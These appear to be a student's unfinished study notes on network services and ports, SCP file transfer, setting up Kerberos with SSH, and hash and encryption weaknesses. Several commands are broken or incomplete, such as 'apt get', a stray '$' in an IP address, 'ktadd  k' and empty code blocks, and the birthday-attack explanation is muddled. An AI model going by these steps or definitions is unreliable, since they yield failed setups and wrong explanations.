Services used for large internal networks for file sharing, printing and more:

Risk: 
Used to enumerate system details to cause complete network compromise.

| Keyword | Definition | Technical |
| --- | -- | -- |
Microsoft RPC |   | 
NetBios |  |
CIFS |

___



| service | port | protocol | 
| --- | -- | --- | 
| loc-srv | 135 | tcp | 
| loc-srvi | 135 | udp | 
| netbios-ns | 137 | udp | 
| netbios-dgm | 138 | udp |
| netbios-ssn | 139 | tcp | 
| microsoft-ds | 445 | tcp | 
| microsoft-ds | 445 | udp | 



## 🚦TRANSFERING A FILE SECURELY WITH SCP AND SFTP🗃️🔐🚦 ##

Transferring files should be confidentially encrypted to secure zero tampering while in transit.
FTP <a href="https://en.wikipedia.org/wiki/File_Transfer_Protocol">[File Transfer Protoco]</a>  was not concieved with proper encryption, hence SFTP is prefered.

In this guide i propose two different commandline linux solutions for encrypted file transfer, SFTP (recommended) and SCP (outdated / not-recommended). 

We are using scp even if it is outdated, for learning purposes.
___
### TOOLS USED ###

| Command | Description | Link | OS |
|  ---    | ---         | ---   | --- |
| (not-recommended)  ```scp``` | Uses SSH for secure copy (outdated)| <a href="https://en.wikipedia.org/wiki/Secure_copy_protocol">[Secure Copy Protocol]</a> | linux |
| ```fstp``` | Uses secure channel (like SSH) for file transfering | <a href="https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol">[SSH File Transfer Protocol]</a> | linux |
| ```cp``` | copy file protocol | <a href="https://en.wikipedia.org/wiki/Cp_(Unix)">[Copy Protocol]</a> | linux |
| (not safe)```ftp``` |file transfer protocol | <a href="https://en.wikipedia.org/wiki/File_Transfer_Protocol">[File Transfer Protoco]</a> | linux |
___

### Requirements ###

Two (linux) host machines either being local🏚️ or remote🌥️ (doesn't make a difference).

[i run two seperate hosts on vmware (community/free) locally]
 
**[IPv4](https://en.wikipedia.org/wiki/IPv4) addresses (IP addresses)** of the two machines🖥️ running linux (preferrable ubuntu servers).

You can find the ip address with ```ifconfig``` look at eth0 and inet.

or 

use ```ip a``` and look for inet.
Basic knowledge of bash command line scripting and perhaps (networking).
___
#### !NETWORK SETUP! ####

On both hosts add a user1 or use another user to send recieve files.

Create a user named "user1"
```bash
adduser user1
```
switch user to "user1"
```bash
su - user1
```
___
### CODE IMPLEMENTATION ###


#### FILE TRASNFER USING SCP(outdated) ####

ON SENDING HOST
```cd``` into the /home/user1 directory
create a file using ```nano``` 
```bash
cd /home/user1
 ```
create a file using ```nano``` 
```bash
nano file.txt
 ```
add some txt
```txt
hello world
```

(not-recommended) use scp to transfer the file.txt
```bash
scp file.txt user1@<ip address>:/home/user1
```
[in my local setup] i use ipv4 address: ```172.16.196.134``` for the recieving server
```bash
scp file.txt user1@$172.16.196.134:/home/user1
```

#### Verify the result on the recieving server ####

ON RECIEVING HOST

```bash
su - user1
```
```bash
cd /home/user1/
```
check if the file.txt appears
```bash
ls 
```
```bash
nano file.txt
```

If the text matches ```hello world```, congratulations you are done✔️.


___

## Kerboros (protocol) 🦮🦮🦮
[![](https://img.youtube.com/vi/npNXXRAvMpU/maxresdefault.jpg)](https://www.youtube.com/watch?v=npNXXRAvMpU&t=524s)
AUTHENTICATION SYSTEM | CENTRALIZED MANAGEMENT | SINGLE SIGN ON (SSO)

Preventing potential threat actors from sniffing any enterprise confidential information can be handle with Kerberos, while maintaining high availability to critical to employee resources.

**[Kerberos](https://web.mit.edu/kerberos/)**  a network authentication protocol [Free], offers usability through it's Ticket Granting System/Ticket based authentication. It uses [symmetric-key cryptography](https://en.wikipedia.org/wiki/Kerberos_(protocol)) and requires a trusted third party and optionally may use public-key cryptography during certain phases of communication.

Uses UDP port 88 as default.


### Kerberos from the inside

 Use Case: End user wishes to gain access to a service supporting Kerberos (Kerberized Service).

 1. End User🖥️ uses **Kerberos client** on their system with *username* & *password*
 2. **Kerberos client** creates *authentication request* in clear text to **authentication server**
 3. **Authentication server** looks up *user* in its *database* and retrieves user's *password*
 4. **Authentication server** sends two messages back to client:
    1. **TGS session key** randomly generated session key for **Kerberos Client** and **Ticket Granting Server** [Message is encrypted using the clients *password*].
    2. **Ticket Granting Ticket** includes information about the **Kerberos Client** and a copy of the client's **TGS session key**.
   Message is encrypted with a key only known to the **ticket-granting server**.
 5. **Kerberos Client** recieves the messages:
    1. Decrypts message using the user's *password*.
    2. This provides access to the **TGS session key** [without correct password, you wont get further].
 6

---

## 🚦IMPLEMENTING KERBEROS🚦 ##

#### KERBEROS SERVER / Key Distribution Center (KDC) 🏰 ####



Open the hosts file.
```bash
sudo nano /etc/hosts
```
add
```txt
127.0.0.1 kdc.example.com
```
to the following to the ip address list so it looks something like this:
```txt
127.0.0.1 localhost
127.0.1.1 ldap
127.0.0.1 kdc.example.com
```

save the file and start installing.
```bash
sudo apt get update
sudo apt install krb5-kdc krb5-admin-server
``` 
Default Kerberos version 5 realm (realm needs to be capital letters):
```txt
EXAMPLE.COM
``` 
Kerberos servers for your realm:
 ```txt
kdc.example.com
```
 Administrative server for your Kerberos realm:      
 ```txt
kdc.example.com
```
**🛑🔐!! PROCTECT THE MASTER KEY !!🔐🛑**
to create the example.com realm run the following command
and you will be prompted to enter a master key, which is very important to store in safe manner.
```bash
sudo krb5_newrealm
```
add a user to manage centrally
```bash
sudo kadmin.local 
```
add a principal, this is what user and services are called 
```bash
addprinc simon 
```
enter a password twice and write 'exit to exit
```bash
exit
```

  edit /etc/krb5.conf file & add the following lines in [domain_realm] section
```txt
.kdc.com = kdc.example.com
kdc.com = kdc.example.com
```

#### CLIENT 🖥️ ####

```bash
sudo apt get update
sudo apt install krb5-user krb5-config
```
create a file called etc krb5.conf
```bash
dpkg-reconfigure krb5-config
```
Default Kerberos version 5 realm:
```txt
EXAMPLE.COM
```
look at the krb5.conf file and configure (based on your setup perhaps automation tools)
```bash
cat /etc/krb5.confl
```
we will edit /etc/krb5.conf file & add the following lines in [domain_realm] section
```txt
.example.com = kdc.example.com
example.com = kdc.example.com
```

**check if we can communicate with the Kerberos server /KDC** 

```bash
kinit -p simon@EXAMPLE.COM
```
list the details of the ticket with
```bash
klist
```
**Client is ready to request Ticket Granting Server**

## Configuring the system access 
We need to configure access on the system that corresponds to the Kerberos Principle.
Add a user simon
```bash
adduser simon
```
in order to let someone log in, the system needs an account for them to use.
Kerberos should handle the authentication/password and the activation of the user's account on that machine. The kerberos user will map onto the local user when they log in.
[PAM](https://en.wikipedia.org/wiki/Linux_PAM) support is added for our Kerberized user:
```bash
sudo apt install libpam-krb5.
```
see and control the inclusion of Kerboros in the PAM files:
```bash
grep krb /etc/pam.d/*
```
**Log in as Kerberized user**

Sign in again to the host/virtual machine, switch to a new console.
After signing in use:
```bash
klist
```
verify you get information about the Kerberos Ticket:
```bash

```
#### PROTECTED SERVER 📭 ####

```bash
sudo apt install krb5 config
```

Edit ***/etc/ssh/sshd_config***

add ***yes*** to following lines:

```txt
GSSAPIAuthentication yes
GSSAPICleanupCredentials yes
```

```bash
restart!!!
```

### KERBEROS SERVER 🏰 ###

  add the ssh server to the kerberos management
  add principal 
  creat a key file
```bash
ktadd  k /tmp/sshserver.kea.dk.keytab
host/sshserver.kea.dk
```
  copy the keyfile to the ssh server /etc directory

```bash
```

### CLIENT 🖥️ ###

  get the ticket from the kerberos server
```bash
kinit root/admin
klist  A 
```


### SUMMARY OF SETUP ###

  install both kerberos server packages on kerboros server
  install kerberos client package
    add get a a ticket for the user that will login remotely
  on ssh server [protected server] 
    install krb5 


___
# CRYPTOGRAPHY #


## 📖 CRYPTOLOGY: HASHING WEAKNESS


Sources:
<p>  <a href="https://www.rfc editor.org/rfc/rfc8554.html">RFC 8554 </a> </p>

<p> <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function"> wikipedia. </a></p>

### 3 Weaknesses of Hashing ###



The hashing function must be deterministic in it's output given an input of arbritary size. 
This is the way hashing is used to encode data for more effcient memory utilization.

This is useful, but not the primer goal of hashing in cryptography.

While providing the effectiveness of hashing algorithm's ability to obfuscate information, like password storage in databases, many algorithms have proven to be weak to certain types of attacks.

Therefore, as always, we must carefully research and evalutate any security methodes, before bringing them to production environment.
According to <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function"> wikipedia <a> the following conditions are met in a secure hash function and it's corresponding output, such as SHA 3 and Argon2.

```
Pre image resistance
Given a hash value h, it should be difficult to find any message m such that h = hash(m). This concept is related to that of a one way function. Functions that lack this property are vulnerable to preimage attacks.
```
```
Second pre image resistance
Given an input m1, it should be difficult to find a different input m2 such that hash(m1) = hash(m2). This property is sometimes referred to as weak collision resistance. Functions that lack this property are vulnerable to second preimage attacks.
```
```
Collision resistance
It should be difficult to find two different messages m1 and m2 such that hash(m1) = hash(m2). Such a pair is called a cryptographic hash collision. This property is sometimes referred to as strong collision resistance. It requires a hash value at least twice as long as that required for pre image resistance; otherwise, collisions may be found by a birthday attack.
```

Attack vectors against hashes (output of the hash functions) count, birthday attacks, preimage attack, second preimage attack.

#### Security / Computational Speed Tradeoff ###

| HASH FUNCTION | SECURITY | SPEED 
| ------        | ------- |  ----- |
| SHA 1         | NOT SECURE | FAST |
| SHA 2         | HIGH    | FAST |
| SHA 3         |  HIGHEST | FAST |
| Argon2         | HIGEHST | SLOW | 
| SHA 256         | HIGH | FAST |
| SHA 512         | VERY HIGH | FAST | 

#### Tools used: ####


| Name | Description | OS |
| ---     | ---            | --   |
| hash identifier | Identifies hash function algorithm based on an output/digest | Linux | 
| <a href="https://gchq.github.io/CyberChef/#input=SGVsbG8gd29ybGQ">Cyber Chef </a> | Online tool for calculating outputs/digests with all major cryptology algorithms | webbrowser |
| John The Ripper | Password cracking tool | Linux |
| Hash Cat | | Linux |




#### Birthday attack ####

Relates to the property, collision resistance. Given the output value, it should be extremely hard to calculate another input value. 

In the case of SHA 256, the security from birthday attacks is given by the 50% of hashing the same output given two distinct hash inputs.

SHA 256 algorithm output birthday attack security level is 2^(256/2) = 2^128 different inputs needed to collide with an existing hash output.

The security level against brithday attacks withing the SHA 1 algorithm output of 160 bits (not secure) is 2^(160/2) = 2^80 different inputs needed to collide with an existing hash output hashed with the same algorithm (SHA 1 of 160 bits).

#### Use Key Derivative Functions for password storage ####

Attackers can download a database of hashed password and attempt to crack the password by comparing salts from already known passwords, and thereby obtain access to matching passwords accounts.

Salting can to some extend prevent attackers success by adding an extra entry/element together with the hashed password. 

***Best practice*** is to couple salting with a Key Derivative Function.

***KDF's, take a key, salt, iterations as inputs.***
The goal is to slow down the process of attempts to bruteforce or use dictionary attakcs to obtain the password or passphrase of a victim.

[![](https://img.youtube.com/vi/mUH5ffD5X5Q/maxresdefault.jpg)](https://www.youtube.com/watch?v=mUH5ffD5X5Q)








   

## 📖 SYMMETRIC ENCRYPTION WEAKNESSES

Sources:

Jon, Hacking The art of exploitation

### Block Ciphers

Hiding relationships between plaintext, ciphertext and the key, are methodes performed by the algorithm to ensure the highest level of security of block ciphers. 

[![](https://img.youtube.com/vi/BwKS_yTj08M/maxresdefault.jpg)](https://www.youtube.com/watch?v=BwKS_yTj08M)

## 📖 HYBRID ENCRYPTION : DIFFIE-HELLMANN (MERKLE)


[![](https://img.youtube.com/vi/9FyBmtdMRiE/maxresdefault.jpg)](https://www.youtube.com/watch?v=9FyBmtdMRiE&t=50s)


## 📖 HYBRID ENCRYPTION : TLS HANDSHAKE


[![](https://img.youtube.com/vi/9FyBmtdMRiE/maxresdefault.jpg)](https://www.youtube.com/watch?v=9FyBmtdMRiE?&t=266s)
